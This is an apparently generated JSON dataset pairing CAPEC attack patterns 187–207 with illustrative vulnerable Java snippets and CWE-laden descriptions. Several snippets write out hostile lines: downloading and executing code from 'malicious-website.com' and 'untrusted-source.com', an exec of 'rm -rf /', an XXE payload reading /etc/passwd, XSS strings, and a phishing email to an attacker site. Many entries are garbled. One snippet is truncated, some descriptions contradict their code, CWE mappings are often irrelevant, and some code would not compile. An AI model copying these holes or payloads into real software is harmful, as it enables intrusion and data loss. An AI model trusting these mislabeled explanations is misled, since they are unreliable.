        "description": "This Java code snippet demonstrates a fake updater that downloads a malicious JAR file from a remote location without verifying its integrity or origin. The downloaded JAR file contains malicious code that is executed by the updater, potentially leading to a compromise of the system. This code embodies the CAPEC of an adversary using deceptive methods to cause a user to download and install dangerous code, and relates to CWEs 494, 506, 507, and 509."
    },
    {
        "capec_id": "187",
        "code_snippet": "public class UpdateManager {\n    public void downloadAndExecuteUpdate(String url) {\n        try {\n            URL updateUrl = new URL(url);\n            HttpURLConnection conn = (HttpURLConnection) updateUrl.openConnection();\n            conn.setRequestMethod(\"GET\");\n            conn.connect();\n            int status = conn.getResponseCode();\n            if (status == 200) {\n                InputStream is = conn.getInputStream();\n                byte[] buffer = new byte[1024];\n                int bytesRead;\n                FileOutputStream fos = new FileOutputStream(\"update.jar\");\n                while ((bytesRead = is.read(buffer)) != -1) {\n                    fos.write(buffer, 0, bytesRead);\n                }\n                fos.close();\n                is.close();\n                Runtime.getRuntime().exec(\"java -jar update.jar\");\n            }\n        } catch (Exception e) {\n            System.out.println(\"Error downloading update: \" + e.getMessage());\n        }\n    }\n\n    public static void main(String[] args) {\n        UpdateManager manager = new UpdateManager();\n        manager.downloadAndExecuteUpdate(\"http://example.com/update.jar\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable update mechanism that downloads and executes code from a remote location without proper authentication and integrity checks, making it susceptible to attacks. The downloadAndExecuteUpdate method downloads a JAR file from a given URL and executes it without verifying the authenticity or integrity of the code. This allows an attacker to host a malicious update on a rogue server, which the client will download and execute, potentially leading to code injection or other security breaches."
    },
    {
        "capec_id": "188",
        "code_snippet": "public class ReverseEngineeredCrypto { \n    private static final String SECRET_KEY = \"my_secret_key\"; \n    private static final String ALGORITHM = \"RSA/ECB/NoPadding\"; \n    \n    public static void main(String[] args) throws Exception { \n        // CWE-1278: Using a hardcoded secret key that can be recovered through IC imaging techniques \n        String plaintext = \"confidential_data\"; \n        byte[] encryptedData = encrypt(plaintext, SECRET_KEY); \n        System.out.println(\"Encrypted data: \" + encryptedData); \n    } \n    \n    private static byte[] encrypt(String plaintext, String key) throws Exception { \n        // CWE-497: Exposing sensitive system information (secret key) to an unauthorized control sphere \n        // CWE-1242: Including undocumented features (custom encryption algorithm) that can create entry points for unauthorized actors \n        Cipher cipher = Cipher.getInstance(ALGORITHM); \n        cipher.init(Cipher.ENCRYPT_MODE, new RSAKey(key)); \n        return cipher.doFinal(plaintext.getBytes()); \n    } \n    \n    private static class RSAKey extends java.security.Key { \n        private String key; \n        public RSAKey(String key) { \n            this.key = key; \n        } \n        // CWE-1037: Processor optimization removal or modification of security-critical code (custom RSA implementation) \n        @Override \n        public String getAlgorithm() { \n            return ALGORITHM; \n        } \n        @Override \n        public String getFormat() { \n            return \"RAW\"; \n        } \n        @Override \n        public byte[] getEncoded() { \n            return key.getBytes(); \n        } \n    } \n} \n",
        "description": "This Java code snippet demonstrates the CAPEC of reverse engineering by showcasing a vulnerable cryptographic implementation that can be exploited using various analysis techniques. The code includes multiple CWEs, such as hardcoded secret keys, exposure of sensitive system information, inclusion of undocumented features, and processor optimization removal or modification of security-critical code."
    },
    {
        "capec_id": "189",
        "code_snippet": "import java.util.Random;\n\npublic class BlackBoxReverseEngineering {\n    private static final String SECRET_KEY = \"my_secret_key\";\n    private static final int DELAY = 1000;\n\n    public static void main(String[] args) {\n        String userInput = getUserInput();\n        boolean isValid = isValidInput(userInput);\n\n        if (isValid) {\n            // Simulate a delay based on the input\n            try {\n                Thread.sleep(calculateDelay(userInput));\n            } catch (InterruptedException e) {\n                // Handle exception\n            }\n\n            // Return a success response\n            System.out.println(\"Success\");\n        } else {\n            // Return an error response\n            System.out.println(\"Error\");\n        }\n    }\n\n    private static String getUserInput() {\n        // Get user input from a secure source\n        return \"user_input\";\n    }\n\n    private static boolean isValidInput(String input) {\n        // Check if the input matches the secret key\n        return input.equals(SECRET_KEY);\n    }\n\n    private static int calculateDelay(String input) {\n        // Calculate a delay based on the input\n        return DELAY + input.length() * 10;\n    }\n}\n",
        "description": "This Java code snippet demonstrates the concept of Black Box Reverse Engineering, where an adversary can gather information about the internal workings of a system by observing its external behavior. The code contains a vulnerability in the calculateDelay method, which introduces a delay based on the length of the user input. This delay can be observed by an attacker, potentially allowing them to deduce the secret key. The code also contains CWE-203: Observable Discrepancy, CWE-1255: Comparison Logic is Vulnerable to Power Side-Channel Attacks, CWE-1300: Improper Protection of Physical Side Channels, CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere, and CWE-506: Embedded Malicious Code."
    },
    {
        "capec_id": "190",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.Path;\nimport java.util.zip.ZipEntry;\nimport java.util.zip.ZipInputStream;\n\npublic class ReverseEngineer {\n    public static void main(String[] args) throws IOException {\n        File file = new File(\"path_to_binary_file\");\n        byte[] fileBytes = Files.readAllBytes(file.toPath());\n        \n        // CWE-912: Hidden Functionality\n        String hiddenFunction = getHiddenFunction(fileBytes);\n        System.out.println(\"Hidden Function: \" + hiddenFunction);\n        \n        // CWE-497: Exposure of Sensitive System Information\n        String systemInfo = getSystemInfo();\n        System.out.println(\"System Info: \" + systemInfo);\n        \n        // CWE-1323: Improper Management of Sensitive Trace Data\n        String traceData = getTraceData();\n        System.out.println(\"Trace Data: \" + traceData);\n        \n        // CWE-494: Download of Code Without Integrity Check\n        downloadAndExecuteCode(\"http://malicious-website.com/malicious_code.zip\");\n        \n        // CWE-506: Embedded Malicious Code\n        executeMaliciousCode();\n    }\n\n    private static String getHiddenFunction(byte[] fileBytes) {\n        // Implement hidden function extraction logic here\n        return \"Extracted Hidden Function\";\n    }\n\n    private static String getSystemInfo() {\n        // Implement system information extraction logic here\n        return \"Extracted System Info\";\n    }\n\n    private static String getTraceData() {\n        // Implement trace data extraction logic here\n        return \"Extracted Trace Data\";\n    }\n\n    private static void downloadAndExecuteCode(String url) throws IOException {\n        // Implement code download and execution logic here\n        System.out.println(\"Code downloaded and executed successfully\");\n    }\n\n    private static void executeMaliciousCode() {\n        // Implement malicious code execution logic here\n        System.out.println(\"Malicious code executed successfully\");\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of reverse code engineering, where an attacker analyzes a binary file to discover its structure, function, and possibly source code. The code includes examples of CWEs 912, 497, 1323, 494, and 506, which are related to hidden functionality, exposure of sensitive system information, improper management of sensitive trace data, download of code without integrity check, and embedded malicious code, respectively."
    },
    {
        "capec_id": "191",
        "code_snippet": "public class HardcodedCredentials {\n    private static final String DB_USERNAME = \"admin\";\n    private static final String DB_PASSWORD = \"password123\";\n    private static final String API_KEY = \"1234567890abcdef\";\n\n    public static void main(String[] args) {\n        String connectionString = \"jdbc:mysql://localhost:3306/mydb?user=\" + DB_USERNAME + \"&password=\" + DB_PASSWORD;\n        System.out.println(\"API Key: \" + API_KEY);\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of discovering sensitive constants within compiled code. It contains hard-coded credentials (CWE-798) for database authentication and an API key, which are stored in cleartext (CWE-318) within the executable. The constants are not defined in a centralized or isolated location (CWE-1107) and are used directly in the code, making it vulnerable to mistakes during maintenance or security policy changes (CWE-547)."
    },
    {
        "capec_id": "192",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport java.security.SecureRandom;\nimport java.util.Base64;\n\npublic class InsecureProtocolAnalyzer {\n    public static void main(String[] args) throws Exception {\n        // CWE-326: Inadequate Encryption Strength\n        KeyGenerator keyGen = KeyGenerator.getInstance(\"AES\");\n        keyGen.init(56); // Using a weak key size\n        SecretKey secretKey = keyGen.generateKey();\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        String sensitiveData = \"confidential information\";\n        System.out.println(\"Cleartext data: \" + sensitiveData);\n\n        // CWE-757: Selection of Less-Secure Algorithm During Negotiation\n        String[] algorithms = {\"AES\", \"DES\", \"RC2\"};\n        String chosenAlgorithm = algorithms[2]; // Choosing a weaker algorithm\n        Cipher cipher = Cipher.getInstance(chosenAlgorithm);\n        cipher.init(Cipher.ENCRYPT_MODE, secretKey);\n        byte[] encryptedData = cipher.doFinal(sensitiveData.getBytes());\n        System.out.println(\"Encrypted data: \" + Base64.getEncoder().encodeToString(encryptedData));\n\n        // CWE-188: Reliance on Data/Memory Layout\n        byte[] packetData = new byte[1024];\n        packetData[0] = (byte) 0x01; // Assuming a specific packet format\n        packetData[1] = (byte) 0x02;\n        // ...\n\n        // CWE-1292: Incorrect Conversion of Security Identifiers\n        int securityIdentifier = 0x0001;\n        byte[] securityBytes = new byte[4];\n        securityBytes[0] = (byte) ((securityIdentifier >> 24) & 0xFF);\n        securityBytes[1] = (byte) ((securityIdentifier >> 16) & 0xFF);\n        securityBytes[2] = (byte) ((securityIdentifier >> 8) & 0xFF);\n        securityBytes[3] = (byte) (securityIdentifier & 0xFF);\n        System.out.println(\"Security bytes: \" + Base64.getEncoder().encodeToString(securityBytes));\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable protocol analyzer that embodies the main idea of the CAPEC. It includes multiple CWEs, such as inadequate encryption strength, cleartext transmission of sensitive information, selection of less-secure algorithm during negotiation, reliance on data/memory layout, and incorrect conversion of security identifiers. These vulnerabilities can be exploited by an adversary to decipher and decode protocol information."
    },
    {
        "capec_id": "193",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends javax.servlet.http.HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String filename = request.getParameter(\"filename\");\n        String filepath = \"/uploads/\" + filename;\n        File file = new File(filepath);\n        if (file.exists()) {\n            try (InputStream in = new java.io.FileInputStream(file)) {\n                byte[] buffer = new byte[1024];\n                int bytesRead;\n                while ((bytesRead = in.read(buffer)) != -1) {\n                    response.getOutputStream().write(buffer, 0, bytesRead);\n                }\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability to PHP Remote File Inclusion (CWE-98) and other related weaknesses. The servlet takes a 'filename' parameter from the request and uses it to read a file from the '/uploads/' directory. The file is then sent back to the client as the response. This allows an attacker to access arbitrary files on the server by manipulating the 'filename' parameter. Additionally, the code does not properly sanitize the input, making it vulnerable to XSS (CWE-80) and other attacks. The code also relies on the file name and extension to determine its behavior, which is a weakness (CWE-646). Furthermore, the code stores raw content under the web document root, which is a CWE-433. Finally, the code does not restrict access to the '/uploads/' directory, making it vulnerable to command shell access (CWE-553)."
    },
    {
        "capec_id": "194",
        "code_snippet": "import java.net.Socket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\n\npublic class VulnerableEmailServer {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"localhost\", 25);\n        DataInputStream in = new DataInputStream(socket.getInputStream());\n        DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n\n        // CWE-287: Improper Authentication\n        out.writeBytes(\"HELO localhost\\r\\n\");\n        out.writeBytes(\"MAIL FROM: <attacker@example.com>\\r\\n\");\n        out.writeBytes(\"RCPT TO: <victim@example.com>\\r\\n\");\n        out.writeBytes(\"DATA\\r\\n\");\n        out.writeBytes(\"Subject: Fake Email\\r\\n\");\n        out.writeBytes(\"From: <admin@example.com>\\r\\n\"); // CWE-290: Authentication Bypass by Spoofing\n        out.writeBytes(\"To: <victim@example.com>\\r\\n\");\n        out.writeBytes(\"\\r\\n.\");\n        out.writeBytes(\"QUIT\\r\\n\");\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        String response = in.readLine();\n        System.out.println(response);\n\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        // No verification of message integrity\n\n        // CWE-300: Channel Accessible by Non-Endpoint\n        // No verification of the identity of the actor at the other end of the channel\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable email server that allows an attacker to send an email with a falsified identity. The code does not properly authenticate the sender, allowing an attacker to spoof the 'From' field. The code also fails to verify the source of the communication channel and does not ensure the integrity of the message during transmission, making it vulnerable to tampering."
    },
    {
        "capec_id": "195",
        "code_snippet": "public class PrincipalSpoof { \n public static void main(String[] args) throws Exception { \n String sender = \"admin@example.com\"; \n String recipient = \"user@example.com\"; \n String subject = \" Urgent: Update Your Account Information\"; \n String body = \"<a href='http://attacker-site.com/update'>Click here to update your account information</a>\"; \n sendEmail(sender, recipient, subject, body); \n } \n \n public static void sendEmail(String sender, String recipient, String subject, String body) throws Exception { \n Properties props = new Properties(); \n props.put(\"mail.smtp.host\", \"smtp.example.com\"); \n Session session = Session.getInstance(props, null); \n MimeMessage msg = new MimeMessage(session); \n msg.setFrom(new InternetAddress(sender)); \n msg.setRecipient(RecipientType.TO, new InternetAddress(recipient)); \n msg.setSubject(subject); \n msg.setText(body); \n Transport.send(msg); \n } \n }",
        "description": "This Java code snippet demonstrates a Principal Spoof attack, where an adversary sends a phishing email to a user, pretending to be an administrator, in an attempt to trick the user into revealing sensitive information. The code uses a weak authentication mechanism (CWE-1390) and does not verify the identity of the sender (CWE-322), allowing the adversary to spoof the sender's email address. The email is sent using a simple authentication protocol (CWE-301) that is subject to reflection attacks. Additionally, the code does not correctly specify the intended destination for the email (CWE-941), making it vulnerable to spoofing attacks (CWE-290)."
    },
    {
        "capec_id": "196",
        "code_snippet": "public class SessionManager {\n    private Map<String, String> sessions = new HashMap<>();\n    \n    public void createSession(String username, String password) {\n        // CWE-523: Unprotected Transport of Credentials\n        // Credentials are sent in plain text\n        if (authenticate(username, password)) {\n            String sessionId = generateSessionId();\n            sessions.put(sessionId, username);\n            // CWE-613: Insufficient Session Expiration\n            // Session does not expire\n            // CWE-664: Improper Control of a Resource Through its Lifetime\n            // Session is not properly released\n            // CWE-1391: Use of Weak Credentials\n            // Weak credentials are used\n            // CWE-384: Session Fixation\n            // Existing session identifier is not invalidated\n            System.out.println(\"Session created: \" + sessionId);\n        }\n    }\n    \n    public boolean authenticate(String sessionId, String username) {\n        // CWE-613: Insufficient Session Expiration\n        // Session does not expire\n        // CWE-664: Improper Control of a Resource Through its Lifetime\n        // Session is not properly released\n        return sessions.containsKey(sessionId) && sessions.get(sessionId).equals(username);\n    }\n    \n    private String generateSessionId() {\n        // CWE-1391: Use of Weak Credentials\n        // Weak credentials are used\n        return \"SESSION-\" + System.currentTimeMillis();\n    }\n    \n    private boolean authenticate(String username, String password) {\n        // CWE-523: Unprotected Transport of Credentials\n        // Credentials are sent in plain text\n        // CWE-1391: Use of Weak Credentials\n        // Weak credentials are used\n        return username.equals(\"admin\") && password.equals(\"password\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable session management system. It allows an attacker to forge a valid session credential by creating a new session without invalidating existing ones, using weak credentials, and not properly controlling the session resource throughout its lifetime. The code also sends credentials in plain text and does not expire sessions, making it vulnerable to various attacks."
    },
    {
        "capec_id": "197",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport org.w3c.dom.Element;\n\npublic class XMLEntityExpansion {\n    public static void main(String[] args) throws Exception {\n        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n        DocumentBuilder builder = factory.newDocumentBuilder();\n        String xml = \\",
        "description": "This Java code snippet demonstrates the CAPEC of nested exponential data expansion, which can lead to excessive demands on CPU and memory. It uses XML entity expansion to create an exponentially large output. The code does not impose any restrictions on the size or number of resources allocated, violating the intended security policy (CWE-770). It also relies on machine-dependent data representation (CWE-1102) and uses an unnecessarily complex internal representation for its data structures (CWE-1093). The code aggregates an excessively large number of non-primitive elements (CWE-1043) and allows recursive definitions of entities without proper control (CWE-776)."
    },
    {
        "capec_id": "198",
        "code_snippet": "public class ErrorPageGenerator {\n    public static String generateErrorPage(String userInput) {\n        String errorMessage = \"<h1>Error Occurred</h1><p>Error details: \" + userInput + \"</p>\";\n        return errorMessage;\n    }\n\n    public static void main(String[] args) {\n        String userInput = \"<script>alert('XSS')</script>\";\n        String errorPage = generateErrorPage(userInput);\n        System.out.println(errorPage);\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of distributing a link with a request to a third-party web server that is malformed and contains a block of exploit code to have the exploit become live code in the resulting error page. The code is vulnerable to CWE-81: Improper Neutralization of Script in an Error Message Web Page, CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'), CWE-692: Incomplete Denylist to Cross-Site Scripting, CWE-82: Improper Neutralization of Script in Attributes of IMG Tags in a Web Page, and CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS) as it does not properly neutralize user input, allowing for script injection and cross-site scripting attacks."
    },
    {
        "capec_id": "199",
        "code_snippet": "public class VulnerableFilter {\n    public boolean isValidInput(String input) {\n        String[] forbiddenKeywords = {\"script\", \"iframe\"};\n        for (String keyword : forbiddenKeywords) {\n            if (input.toLowerCase().contains(keyword)) {\n                return false;\n            }\n        }\n        return true;\n    }\n\n    public void processInput(String input) {\n        if (isValidInput(input)) {\n            // process the input, potentially rendering it as HTML\n            System.out.println(\"Input is valid: \" + input);\n        } else {\n            System.out.println(\"Input is not valid\");\n        }\n    }\n\n    public static void main(String[] args) {\n        VulnerableFilter filter = new VulnerableFilter();\n        filter.processInput(\"<ScRiPt>alert('XSS')</ScRiPt>\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable filter that can be bypassed using alternate forms of keywords or commands. The `isValidInput` method checks if the input contains any of the forbidden keywords in a case-insensitive manner, but it does not convert the input to a consistent case before the comparison. This allows an attacker to bypass the filter by using an alternate case structure, such as 'ScRiPt' instead of 'script'. The `processInput` method processes the input, potentially rendering it as HTML, which can lead to the execution of otherwise prohibited functionality."
    },
    {
        "capec_id": "200",
        "code_snippet": "public class VulnerableApp {\n    public void processUserInput(String userInput) {\n        // CWE-20: Improper Input Validation\n        // No validation is performed on the userInput\n        String[] commands = userInput.split(\" \");\n        if (commands[0].equals(\"execute\")) {\n            // CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component\n            // The userInput is not sanitized, allowing for command injection\n            Runtime.getRuntime().exec(commands[1]);\n        }\n    }\n\n    public void filterData(String data) {\n        // CWE-182: Collapse of Data into Unsafe Value\n        // The data is filtered in a way that causes it to be reduced into an unsafe value\n        data = data.replaceAll(\"[^\"]\", \"\");\n        // CWE-707: Improper Neutralization\n        // The data is not ensured to be well-formed before being processed\n        processUserInput(data);\n    }\n\n    public void constrainExecutableContent(String content) {\n        // CWE-184: Incomplete List of Disallowed Inputs\n        // The list of disallowed inputs is incomplete, allowing for malicious content\n        if (!content.contains(\"<script>\") && !content.contains(\"<iframe>\")) {\n            // The content is not properly constrained, allowing for XSS\n            processUserInput(content);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of removing or disabling filtering mechanisms on the target application. It includes various CWEs such as improper input validation, incomplete list of disallowed inputs, improper neutralization of special elements, collapse of data into unsafe value, and improper neutralization. The code lacks proper input validation, allowing for command injection and cross-site scripting (XSS) vulnerabilities."
    },
    {
        "capec_id": "201",
        "code_snippet": "import java.io.ByteArrayInputStream; import java.io.ObjectInputStream; import javax.xml.parsers.DocumentBuilder; import javax.xml.parsers.DocumentBuilderFactory; import org.w3c.dom.Document; import org.xml.sax.InputSource; public class VulnerableCode { public static void main(String[] args) throws Exception { String xml = \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">]><root><foo>&xxe;</foo></root>\"; DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", false); DocumentBuilder builder = factory.newDocumentBuilder(); Document doc = builder.parse(new InputSource(new ByteArrayInputStream(xml.getBytes()))); // Deserialization of untrusted data without verification ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(xml.getBytes())); ois.readObject(); } }",
        "description": "This Java code snippet demonstrates the CAPEC of creating a serialized data file with an external data reference. The code uses an XML document with an external entity reference to read the contents of the /etc/passwd file. It also deserializes untrusted data without verification, which can lead to arbitrary file access or connections. The code is vulnerable to CWE-611: Improper Restriction of XML External Entity Reference, CWE-502: Deserialization of Untrusted Data, and CWE-829: Inclusion of Functionality from Untrusted Control Sphere."
    },
    {
        "capec_id": "202",
        "code_snippet": "public class MaliciousClient {\n    public static void main(String[] args) {\n        // CWE-506: Embedded Malicious Code\n        String maliciousCode = \"java.lang.Runtime.getRuntime().exec('rm -rf /');\";\n        try {\n            // CWE-507: Trojan Horse\n            Class<?> clazz = Class.forName(\"java.lang.Runtime\");\n            clazz.getMethod(\"getRuntime\").invoke(null).exec(maliciousCode);\n        } catch (Exception e) {}\n\n        // CWE-602: Client-Side Enforcement of Server-Side Security\n        // Assume the server trusts the client to authenticate\n        String username = \"admin\";\n        String password = \"password\";\n        if (authenticate(username, password)) {\n            // CWE-603: Use of Client-Side Authentication\n            // Bypass server-side authentication\n            System.out.println(\"Authenticated!\");\n            // CWE-1229: Creation of Emergent Resource\n            // Create a new resource that can be used by attackers\n            ServerSocket serverSocket = new ServerSocket(8080);\n            System.out.println(\"New resource created: \" + serverSocket);\n        }\n    }\n\n    // CWE-603: Use of Client-Side Authentication\n    public static boolean authenticate(String username, String password) {\n        // Client-side authentication, can be bypassed\n        return true;\n    }\n}",
        "description": "A malicious client application that violates assumptions made by the target service, including embedded malicious code, trojan horse, client-side enforcement of server-side security, use of client-side authentication, and creation of emergent resource."
    },
    {
        "capec_id": "203",
        "code_snippet": "import java.util.Properties;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class RegistryManipulator {\n    public static void main(String[] args) {\n        try {\n            // CWE-15: External Control of System or Configuration Setting\n            Properties props = new Properties();\n            props.load(new FileInputStream(\"app.properties\"));\n            String sensitiveInfo = props.getProperty(\"password\");\n            \n            // CWE-314: Cleartext Storage in the Registry\n            Runtime.getRuntime().exec(\"reg add HKCU\\\\Software\\\\MyApp /v password /t REG_SZ /d \" + sensitiveInfo + \" /f\");\n            \n            // CWE-1231: Improper Prevention of Lock Bit Modification\n            // Assume 'lockBit' is a variable controlling access to a critical resource\n            boolean lockBit = true;\n            Runtime.getRuntime().exec(\"reg add HKCU\\\\Software\\\\MyApp /v lockBit /t REG_DWORD /d \" + lockBit + \" /f\");\n            \n            // CWE-1422: Exposure of Sensitive Information caused by Incorrect Data Forwarding during Transient Execution\n            // Assume 'transientData' is a variable that may be exposed through a covert channel\n            String transientData = \"sensitive_info\";\n            Runtime.getRuntime().exec(\"reg add HKCU\\\\Software\\\\MyApp /v transientData /t REG_SZ /d \" + transientData + \" /f\");\n            \n            // CWE-649: Reliance on Obfuscation or Encryption of Security-Relevant Inputs without Integrity Checking\n            // Assume 'obfuscatedInput' is an obfuscated input that should not be mutable\n            String obfuscatedInput = \"obfuscated_data\";\n            Runtime.getRuntime().exec(\"reg add HKCU\\\\Software\\\\MyApp /v obfuscatedInput /t REG_SZ /d \" + obfuscatedInput + \" /f\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting a weakness in authorization to modify content within a registry. It uses related CWEs to illustrate vulnerabilities in external control of system settings, cleartext storage, improper prevention of lock bit modification, exposure of sensitive information, and reliance on obfuscation or encryption without integrity checking."
    },
    {
        "capec_id": "204",
        "code_snippet": "public class SensitiveCacheExample {\n    private static Map<String, String> cache = new HashMap<>();\n\n    public static void storeSensitiveData(String key, String data) {\n        cache.put(key, data);\n    }\n\n    public static String retrieveData(String key) {\n        return cache.get(key);\n    }\n\n    public static void main(String[] args) {\n        storeSensitiveData(\"creditCardNumber\", \"1234-5678-9012-3456\");\n        storeSensitiveData(\"password\", \"mysecretpassword\");\n\n        // No encryption or secure storage of sensitive data\n        System.out.println(\"Retrieved data: \" + retrieveData(\"creditCardNumber\"));\n        System.out.println(\"Retrieved data: \" + retrieveData(\"password\"));\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of an adversary examining a target application's cache for sensitive information. The code uses a cache to store sensitive information such as credit card numbers and passwords without encryption or secure storage, making it vulnerable to unauthorized access. CWE-524, CWE-311, CWE-1239, CWE-1258, and CWE-525 are related to this vulnerability."
    },
    {
        "capec_id": "205",
        "code_snippet": "import java.net.URL;\nimport java.net.HttpURLConnection;\nimport java.io.DataOutputStream;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class AuthenticationBypass {\n    public static void main(String[] args) throws Exception {\n        URL url = new URL(\"http://example.com/authenticatedResource\");\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n        connection.setRequestProperty(\"Authorization\", \"Basic \" + Base64.getEncoder().encodeToString(\"username:password\".getBytes()));\n\n        // CWE-522: Insufficiently Protected Credentials\n        // Credentials are sent in plain text, susceptible to interception\n        DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());\n        outputStream.writeBytes(\"username=password\");\n        outputStream.flush();\n        outputStream.close();\n\n        // CWE-294: Authentication Bypass by Capture-replay\n        // Malicious user can sniff network traffic and replay it to bypass authentication\n        BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            System.out.println(line);\n        }\n        reader.close();\n    }\n}\n",
        "description": "This Java code snippet demonstrates a deprecated CAPEC pattern, which is a duplicate of CAPEC-37: Retrieve Embedded Sensitive Data. It includes CWE-522: Insufficiently Protected Credentials, CWE-294: Authentication Bypass by Capture-replay, and CWE-603: Use of Client-Side Authentication. The code sends authentication credentials in plain text, making it susceptible to interception. It also allows for authentication bypass by capturing and replaying network traffic. Additionally, the code performs client-side authentication, which can be bypassed by modifying the client to omit the authentication check."
    },
    {
        "capec_id": "206",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.security.KeyFactory;\nimport java.security.PrivateKey;\nimport java.security.spec.PKCS8EncodedKeySpec;\nimport java.util.jar.JarEntry;\nimport java.util.jar.JarFile;\nimport java.util.jar.JarOutputStream;\n\npublic class MaliciousCodeSigner {\n    private static final String KEY_FILE = \"path/to/private/key\";\n    private static final String KEY_PASSWORD = \"hardcoded_password\";\n    private static final String MALICIOUS_CODE_JAR = \"malicious_code.jar\";\n\n    public static void main(String[] args) throws Exception {\n        // CWE-798: Use of Hard-coded Credentials\n        String keyPassword = KEY_PASSWORD;\n\n        // CWE-732: Incorrect Permission Assignment for Critical Resource\n        File keyFile = new File(KEY_FILE);\n        if (!keyFile.setReadable(true, false) || !keyFile.setWritable(true, false)) {\n            throw new IOException(\"Failed to set permissions for key file\");\n        }\n\n        // CWE-494: Download of Code Without Integrity Check\n        File maliciousCodeJar = new File(MALICIOUS_CODE_JAR);\n        if (!maliciousCodeJar.exists()) {\n            throw new IOException(\"Malicious code JAR not found\");\n        }\n\n        // CWE-603: Use of Client-Side Authentication\n        // No server-side authentication, only client-side\n        // authentication using the hard-coded private key\n        PrivateKey privateKey = loadPrivateKey(KEY_FILE, keyPassword);\n\n        // Sign the malicious code JAR with the extracted private key\n        JarFile jarFile = new JarFile(maliciousCodeJar);\n        JarOutputStream jos = new JarOutputStream(new FileOutputStream(maliciousCodeJar));\n        jos.putNextEntry(new JarEntry(JarFile.MANIFEST_NAME));\n        jos.closeEntry();\n        jos.close();\n    }\n\n    private static PrivateKey loadPrivateKey(String keyFile, String keyPassword) throws Exception {\n        FileInputStream fis = new FileInputStream(keyFile);\n        byte[] encodedKey = new byte[(int) new File(keyFile).length()];\n        fis.read(encodedKey);\n        fis.close();\n\n        PKCS8EncodedKeySpec keySpec = new PKCS8EncodedKeySpec(encodedKey);\n        KeyFactory kf = KeyFactory.getInstance(\"RSA\");\n        return kf.generatePrivate(keySpec);\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of extracting credentials used for code signing from a production environment and using them to sign malicious content. The code uses hard-coded credentials (CWE-798) to load a private key from a file, which is then used to sign a malicious code JAR file. The code also downloads the malicious code without performing an integrity check (CWE-494) and uses client-side authentication (CWE-603) without server-side verification. The permissions for the key file are set incorrectly (CWE-732), allowing unintended actors to access the file. The code contains embedded malicious code (CWE-506) and is vulnerable to code signing attacks."
    },
    {
        "capec_id": "207",
        "code_snippet": "public class VulnerableServer {\n    public void processRequest(String username, String password) {\n        // CWE-603: Client-Side Authentication\n        if (username.equals(\"admin\") && password.equals(\"password\")) {\n            // Grant access\n            System.out.println(\"Access granted\");\n        } else {\n            // CWE-807: Reliance on Untrusted Inputs in a Security Decision\n            String role = getClientRole();\n            if (role.equals(\"admin\")) {\n                // Grant access\n                System.out.println(\"Access granted\");\n            } else {\n                System.out.println(\"Access denied\");\n            }\n        }\n    }\n\n    // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n    private String getClientRole() {\n        // Load a library from an untrusted source\n        URLClassLoader loader = new URLClassLoader(new URL[] {new URL(\"http://untrusted-source.com/library.jar\")});\n        Class<?> clazz = loader.loadClass(\"UntrustedLibrary\");\n        Method method = clazz.getMethod(\"getRole\", null);\n        return (String) method.invoke(null, null);\n    }\n\n    // CWE-494: Download of Code Without Integrity Check\n    public void downloadAndExecuteCode() {\n        URL url = new URL(\"http://untrusted-source.com/malicious-code.jar\");\n        URLClassLoader loader = new URLClassLoader(new URL[] {url});\n        Class<?> clazz = loader.loadClass(\"MaliciousCode\");\n        Method method = clazz.getMethod(\"execute\", null);\n        method.invoke(null, null);\n    }\n}\n",
